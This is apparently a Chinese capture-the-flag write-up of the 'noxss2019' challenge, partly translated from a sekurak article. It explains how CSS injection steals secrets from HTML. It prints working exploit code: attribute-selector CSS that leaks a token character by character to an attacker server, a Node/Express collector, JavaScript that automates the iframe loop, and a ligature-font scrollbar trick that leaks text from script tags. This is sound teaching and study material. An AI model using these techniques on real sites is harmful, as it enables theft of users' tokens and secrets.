> 原文链接: https://www.anquanke.com//post/id/190467 


# 通过CSS注入窃取HTML中的数据


                                阅读量   
                                **958800**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t014528a5eeeb6f1bd1.png)](https://p4.ssl.qhimg.com/t014528a5eeeb6f1bd1.png)



## 前言

这次XCTF Final很开心在队友的带领下拿了个冠军，比赛中有一道noxss2019很有意思在这里学习一下。

这篇文章可以当作是此文：[https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)的翻译文。



## noxss2019

可控点在`[@import](https://github.com/import) url()`路径中，但是尖括号和双引号等被转义了。

[![](https://p5.ssl.qhimg.com/dm/1024_635_/t014d2549e8accf82b2.png)](https://p5.ssl.qhimg.com/dm/1024_635_/t014d2549e8accf82b2.png)

我们需要构造xss来获取下面 `&lt;script&gt;` 标签中 `secret` 的内容。

[![](https://p4.ssl.qhimg.com/dm/1024_375_/t01cd90bab1ed528cc4.png)](https://p4.ssl.qhimg.com/dm/1024_375_/t01cd90bab1ed528cc4.png)

**css本身是一种容错率很强的语言，css文件即使遇到错误，也会一直读取，直到有符合结构的语句**。

我们可以利用css解析的容错性构造 `%0a)`{``}`body`{`color:red`}`/*` 来执行任意css。

[![](https://p3.ssl.qhimg.com/dm/1024_604_/t01dd19c68ecf7c6eec.png)](https://p3.ssl.qhimg.com/dm/1024_604_/t01dd19c68ecf7c6eec.png)

后面就是参考这篇文章:[https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)去窃取管理员的secret内容。

假设我们有一个php页面

```
&lt;?php
$token1 = md5($_SERVER['HTTP_USER_AGENT']);
$token2 = md5($token1);
?&gt;
&lt;!doctype html&gt;&lt;meta charset=utf-8&gt;
&lt;input type=hidden value=&lt;?=$token1 ?&gt;&gt;
&lt;script&gt;
    var TOKEN = "&lt;?=$token2 ?&gt;";
&lt;/script&gt;

&lt;style&gt;
    &lt;?=preg_replace('#&lt;/style#i', '#', $_GET['css']) ?&gt;

&lt;/style&gt;
```

页面中有两个token，一个在 `&lt;input&gt;` 标签中，一个在 `&lt;script&gt;` 内。然后我们需要利用css参数构造xss来窃取这两个token。

### <a class="reference-link" name="%E7%AA%83%E5%8F%96input%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84token"></a>窃取input标签中的token

CSS选择器使我们能够准确选择HTML元素。

```
/*选择value值为abc的input标签*/
input[value="abc"] `{` `}`

/*选择value值以a开头的input标签 */
input[value^="a"] `{` `}`
```

因此我们可以利用此来为属性的第一个字符的所有可能值准备不同的样式

```
input[value^="0"] `{`
    background: url(http://serwer-napastnika/0);
`}`
input[value^="1"] `{`
    background: url(http://serwer-napastnika/1);
`}`
input[value^="2"] `{`
    background: url(http://serwer-napastnika/2);
`}`
...
input[value^="e"] `{`
    background: url(http://serwer-napastnika/e);
`}`
input[value^="f"] `{`
    background: url(http://serwer-napastnika/f);
`}`
```

[![](https://p1.ssl.qhimg.com/dm/1024_311_/t01ca16c7258afa9a9e.png)](https://p1.ssl.qhimg.com/dm/1024_311_/t01ca16c7258afa9a9e.png)

[![](https://p5.ssl.qhimg.com/dm/1024_323_/t01aad85c07e074b37e.png)](https://p5.ssl.qhimg.com/dm/1024_323_/t01aad85c07e074b37e.png)

同理我们可以依次提取出所有的token值。

然后我们需要利用javascript将上述过程自动化:
- HTML页面将使用js把CSS提取到的内容请求到攻击者的服务器上
- 攻击者的服务器会接受带有CSS提取的内容并进行反向通信，告诉客户端js如何提取内容
- 客户端js与攻击者的服务器之间的通信将通过cookie。例如如果攻击者的服务器收到token的前两个字符为’49’，则设置 `cookie=49` ，客户端js将定期检查cookie是否已设置，如果已设置，它将使用其值生成新的CSS来提取下一个标记字符。
假设服务器后端使用nodejs实现，创建`package.json` 并执行`npm install`

```
`{`
  "name": "css-attack-1",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "dependencies": `{`
    "express": "^4.15.5",
    "js-cookie": "^2.1.4"
  `}`,
  "devDependencies": `{``}`,
  "author": "",
  "license": "ISC"
`}`
```

```
const express = require('express');
const app = express();

app.disable('etag');

const PORT = 3000;

app.get('/token/:token',(req,res) =&gt; `{`
    const `{` token `}` = req.params; //var `{`a`}` = `{`a:1, b:2`}`; =&gt; var obj = `{`a:1, b:2`}`;var a = obj.a;
        console.log(token);
    res.cookie('token',token);
    res.send('')
`}`);

app.get('/cookie.js',(req,res) =&gt; `{`
    res.sendFile('js.cookie.js',`{`
        root: './node_modules/js-cookie/src/'
    `}`);
`}`);

app.get('/index.html',(req,res) =&gt; `{`
    res.sendFile('index.html',`{`
        root: '.'
    `}`);
`}`);

app.listen(PORT, () =&gt; `{`
    console.log(`Listening on $`{`PORT`}`...`);
`}`);
```

然后我们需要构造一个HTML文件来窃取token的所有下一个字符。现在我们已知：
- 我们要从0-9a-f范围内提取由32个字符组成的令牌，
- 我们有一个存在CSS注入的页面，我们可以通过HTML的 `&lt;iframe&gt;` 标签来引用此页面。
攻击流程如下：
1. 如果我们目前设法提取的令牌长度小于预期的长度，则我们执行以下操作
1. 删除包含所有先前提取数据的cookie
1. 创建一个iframe标签，并引用一个易受攻击的页面，该页面具有相应的css代码，允许我们提取另一个标记字符。
1. 我们一直等到攻击者服务器的回调为我们设置含有token的cookie
1. 设置cookie后，我们将其设置为当前的已知令牌值，并返回到步骤1
初步代码如下：

```
&lt;!doctype html&gt;&lt;meta charset=utf-8&gt;
&lt;script src="http://127.0.0.1:3000/cookie.js"&gt;&lt;/script&gt;
&lt;big id=token&gt;&lt;/big&gt;&lt;br&gt;
&lt;iframe id=iframe&gt;&lt;/iframe&gt;
&lt;script&gt;
    (async function() `{`
        const EXPECTED_TOKEN_LENGTH = 32;
        const ALPHABET = Array.from("0123456789abcdef");
                const iframe = document.getElementById('iframe');
        let extractedToken = '';

        while (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) `{`
            clearTokenCookie();
            createIframeWithCss();
            extractedToken = await getTokenFromCookie();

            document.getElementById('token').textContent = extractedToken;
        `}`
         `}`)();
&lt;/script&gt;
```

然后我们需要补充上面的的一些功能函数

首先我们清除cookie中的token值，可以直接使用`JS-cookie` 库中的`Cookie`对象。

[https://github.com/js-cookie/js-cookie](https://github.com/js-cookie/js-cookie)

```
function clearTokenCookie() `{`
    Cookies.remove('token');
`}`
```

接下来，我们需要为 `&lt;iframe&gt;` 标签分配正确的URL：

```
function createIframeWithCss() `{`
    iframe.src = 'http://localhost:12345/?css=' + encodeURIComponent(generateCSS());
`}`
```

还要实现生成适当CSS的功能

```
function generateCSS() `{`
    let css = '';
    for (let char of ALPHABET) `{`
        css += `input[value^="$`{`extractedToken`}`$`{`char`}`"] `{`
            background: url(http://127.0.0.1:3000/token/$`{`extractedToken`}`$`{`char`}`)
        `}``;
    `}`      

    return css;
`}`
```

最后我们需要实现通过等待反向连接来设置cookie-token的功能。我们将使用JS中的 `Promise` 机制来构建异步函数，我们的代码每隔50毫秒检查一次cookie是否已设置，如果已设置，该函数将立即返回该值。

```
function getTokenFromCookie() `{`
    return new Promise(resolve =&gt; `{`
        const interval = setInterval(function() `{`
            const token = Cookies.get('token');
            if (token) `{`
                clearInterval(interval);
                resolve(token);
            `}`
        `}`, 50);
    `}`);
`}`
```

最后，实现攻击的代码如下所示：

```
&lt;!doctype html&gt;&lt;meta charset=utf-8&gt;
&lt;script src="http://127.0.0.1:3000/cookie.js"&gt;&lt;/script&gt;
&lt;big id=token&gt;&lt;/big&gt;&lt;br&gt;
&lt;iframe id=iframe&gt;&lt;/iframe&gt;
&lt;script&gt;
    (async function() `{`
        const EXPECTED_TOKEN_LENGTH = 32;
        const ALPHABET = Array.from("0123456789abcdef");
        const iframe = document.getElementById('iframe');
        let extractedToken = '';

        while (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) `{`
            clearTokenCookie();
            createIframeWithCss();
            extractedToken = await getTokenFromCookie();

            document.getElementById('token').textContent = extractedToken;
        `}`

        function getTokenFromCookie() `{`
            return new Promise(resolve =&gt; `{`
                const interval = setInterval(function() `{`
                    const token = Cookies.get('token');
                    if (token) `{`
                        clearInterval(interval);
                        resolve(token);
                    `}`
                `}`, 50);
            `}`);
        `}`

        function clearTokenCookie() `{`
            Cookies.remove('token');
        `}`

        function generateCSS() `{`
            let css = '';
            for (let char of ALPHABET) `{`
                css += `input[value^="$`{`extractedToken`}`$`{`char`}`"] `{`
                    background: url(http://127.0.0.1:3000/token/$`{`extractedToken`}`$`{`char`}`)
                `}``;
            `}`      

            return css;
        `}`

        function createIframeWithCss() `{`
            iframe.src = 'http://localhost:12345/secret.php?css=' + encodeURIComponent(generateCSS());
        `}`

    `}`)();
&lt;/script&gt;
```

将其保存在index.js同目录下，并且命名为index.html。

访问127.0.0.1:3000/index.html

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_419_/t011aa3df9113bb9c0c.png)

[![](https://p3.ssl.qhimg.com/dm/1024_585_/t015a132cba51020e70.png)](https://p3.ssl.qhimg.com/dm/1024_585_/t015a132cba51020e70.png)

### 窃取`&lt;script&gt;`标签中的token

CSS选择器只能帮助我们根据属性值的开头来标识元素，但是我们不能对标记本身中包含的文本执行相同的操作(CSS只是没有这种类型的选择器)。

那么我们如何在`&lt;script&gt;`标签内获取token？比如下面的代码中。

```
&lt;script&gt;
    var TOKEN = "06d36aed58d87fd8db3729ab84f1fe3d";
&lt;/script&gt;
```

我们将使用连字和样式滚动条定义我们自己的字体来完成攻击。

什么是连字：[http://www.mzh.ren/ligature-intro.html](http://www.mzh.ren/ligature-intro.html)

借助`_fontforge`等其他软件 ，我们可以创建自己的字体包括自己的连字。

** `_Fontforge`**是一个相当强大的字体创建工具。我们将使用它将字体从SVG格式转换为WOFF。

```
#!/usr/bin/fontforge
Open($1)
Generate($1:r + ".woff")
```

`fontforge script.fontforge &lt;plik&gt;.svg`

让我们看看SVG中的字体定义如何。下面是一个简单字体的示例，其中未为拉丁字母的所有小写字母分配任何图形符号，并且宽度均为0（属性：**horiz-adv-x = “0” **），同时还定义了`_securak`_连字 ，它也是图形符号没有，但是为他设置了很大的宽度值。

```
&lt;svg&gt;
  &lt;defs&gt;
    &lt;font id="hack" horiz-adv-x="0"&gt;
      &lt;font-face font-family="hack" units-per-em="1000" /&gt;
      &lt;missing-glyph /&gt;
      &lt;glyph unicode="a" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="b" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="c" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="d" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="e" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="f" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="g" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="h" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="i" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="j" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="k" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="l" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="m" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="n" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="o" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="p" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="q" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="r" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="s" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="t" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="u" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="v" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="w" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="x" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="y" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="z" horiz-adv-x="0" d="M1 0z"/&gt;
      &lt;glyph unicode="sekurak" horiz-adv-x="8000" d="M1 0z"/&gt;
    &lt;/font&gt;
  &lt;/defs&gt;
&lt;/svg&gt;
```

```
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="UTF-8"&gt;
&lt;title&gt;Untitled Document&lt;/title&gt;
&lt;style&gt;
@font-face `{`
    font-family: "hack";
    src: url(data:application/x-font-woff;base64,d09GRk9UVE8AAASQAA0AAAAABrAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABDRkYgAAADCAAAAMUAAAESIYipMEZGVE0AAAR0AAAAGQAAAByNNn8cR0RFRgAAA9AAAAAhAAAAJABOADlHUE9TAAAEQAAAACAAAAAgbJF0j0dTVUIAAAP0AAAASQAAAFrZZNxYT1MvMgAAAYQAAABEAAAAYFXjXMBjbWFwAAACpAAAAFgAAAFKYztWsWhlYWQAAAEwAAAAKgAAADYS6ZoHaGhlYQAAAVwAAAAgAAAAJAN85DxobXR4AAAEYAAAABEAAABw5OcAAG1heHAAAAF8AAAABgAAAAYAHFAAbmFtZQAAAcgAAADaAAABYiFRA6twb3N0AAAC/AAAAAwAAAAgAAMAAHicY2BkYGAAYpOXdZLx/DZfGbiZXwBFGG4+XTMRmYYCDgYmEAUAQpwKTAAAeJxjYGRgYFb4b8EQxfyCgeHBfwYGBqAICpABAHGNBJ0AAFAAABwAAHicY2Bm/MI4gYGVgYOpi2kPAwNDD4RmfMBgyMjEwMDEwMrMAAOMDEggIM01hcGBIZGhilnhvwVDFIYaBSBkBwBaygpNeJxdkDtOAzEQhr9NNuEp6NLijmpX9ioNqahyAIr0q8jaRES7kpNcghohcQwOQM21+B2GJh7Z883on4cM3PJBQT4FJdfGIy54MB7j2BqXsnfjCTd8GU+V/5GyKK+UuTxVZR5xx73xmGcejUtp3ownzPg0nir/zYaWNa+wadd6X4h0HNkpnRTG7rhrBUsGeg4nn6SIWrShxssvdP/b/EVzKoKsksbLP6nB0B+WQ+qia2rvFi6Pk5tXIVSND1KcbbLSjMRe35EnO3XJ01jFtN8OvQu1Py/5BWsjLgEAAHicY2BgYGaAYBkGRgYQcAHyGMF8FgYNIM0GpBkZmICsqv//wSoSQfT/BVD1QMDIxoDg0AowMjGzsLKxc3BycfPw8vELCAoJi4iKiUtIStHaZqIAALdlCJ94nGNgZsALAAB9AAR4nGNkYGFhYGRkZM1ITM5mYGRiYGTQ+CHD9EOW+YcESzcPczcPSzcQsMowxPLLMDAIyDBMEZRhYJdh5BZiYAap5mMQYhArjk+Nz44vjS+KT4zPBpkENg0InBicGVwYXBncGNwZPBg8GbwYvBl8GHwZ/Bj8GQIYAhmCGIIZQhhCGcIYwhkiGCIZohiiGdsZZBgZWdi5eAWExSRl5JVUNbT1DE3MrWwdnN08ffyDIn7V8PWIURPJPPgPJLtFukW7ebgA4FE4WAAAAHicY2BkYGDgAWIZIGYCQkYGKSCWBkImBhawGAMACZ8AiAAAAHicLYk7CoAwFATnwROD6QxWiifwUqmCEKxy/7h+imWYWQyY2DmwmttFwFXoneexepasxmf6/GXQtp/OyshAZGGWR81IN43bBm8AAAAAAQAAAAoAHAAeAAFsYXRuAAgABAAAAAD//wAAAAAAAHicY37BQDfw4D8DAwBs1QLLAAAAeJxjYGBgZACCm9mqP8H00zUTYTQAVA0IWgAAAA==);
`}`    

span `{`
    background: lightblue;
    font-family: "hack";
`}`
body `{`
    white-space: nowrap;
`}`
body`{`
    overflow-y: hidden;
    overflow-x: auto;
`}`
body::-webkit-scrollbar `{`
    background-color: blue;
`}`
body::-webkit-scrollbar:horizontal `{`
    background: url(http://127.0.0.1:999);
`}`
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;span id=span&gt;123sekurak123&lt;/span&gt;
&lt;/body&gt;
&lt;/html&gt;
```

我们设置iframe的`width=900px`,连字体设置非常大，当出现连字`sekurak`时就会出现滚动条，从而请求攻击者的服务器。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_331_/t01eb9c2c7a1ef7d1d9.png)

后面就是代码实现和思路的问题了，具体可以看zsx师傅写的[https://xz.aliyun.com/t/6655#toc-5](https://xz.aliyun.com/t/6655#toc-5)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_286_/t019ec5dd583e8891e6.png)



## 后记

很有意思的一个点，学到了很多。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01379308a7d7c8179a.jpg)
